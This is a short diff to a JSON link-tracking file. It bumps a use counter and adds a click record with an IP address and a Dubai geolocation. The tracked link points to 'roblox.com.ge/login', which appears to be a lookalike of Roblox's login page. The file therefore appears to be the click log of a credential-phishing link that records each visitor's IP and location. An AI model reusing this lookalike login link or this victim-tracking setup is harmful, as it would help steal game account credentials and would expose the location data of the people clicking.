@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 900,
+    "useCount": 901,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7315,6 +7315,14 @@
       },
       {
         "timestamp": 1777195987987,
+        "ip": "2.49.42.28",
+        "country": "United Arab Emirates",
+        "city": "Dubai",
+        "flag": "🇦🇪",
+        "countryCode": "AE"
+      },
+      {
+        "timestamp": 1777196049333,
         "ip": "2.49.42.28",
         "country": "United Arab Emirates",
         "city": "Dubai",
